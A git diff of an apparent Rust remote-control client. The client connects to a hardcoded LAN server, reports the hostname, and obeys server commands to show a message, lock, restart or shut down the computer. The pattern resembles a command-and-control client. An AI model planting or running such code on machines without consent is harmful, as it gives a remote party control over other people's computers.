@@ -4,15 +4,23 @@ use std::io::{Result, Read, Write};
 use std::net::TcpStream;
 
 use components::message;
+use components::lock;
+use components::restart;
+use components::shutdown;
+
 pub mod utilities;
 mod components {
     pub mod message;
+    pub mod lock;
+    pub mod restart;
+    pub mod shutdown;
 }
 
 const SERVER : &str = "192.168.2.220";
 const PORT : &str = "5005";
 
 fn main() {
+    println!("Connecting to {}:{}", SERVER, PORT);
     match TcpStream::connect(format!("{}:{}", SERVER, PORT)) {
         Ok(mut stream) => {
             let computer_name = hostname::get().unwrap().into_string().unwrap().into_bytes();
@@ -26,6 +34,7 @@ fn main() {
             loop {
                 match stream.read(&mut buffer) {
                     Ok(0) | Err(_) => {
+                        println!("Connection closed");
                         main();
                     }
                     Ok(bytes_read) => {
@@ -40,8 +49,14 @@ fn main() {
                                 main();
                             }
                             "message" => message::vb_box(&stream, appdata_folder.clone()),
+                            "lock" => lock::lock_computer(&stream),
+                            "restart" => restart::restart_computer(&stream),
+                            "shutdown" => shutdown::shutdown_computer(&stream),
                             
-                            _ => continue
+                            _ => {
+                                println!("Unknown command: {}", command);
+                                main();
+                            }
                         }
                     }
                 }
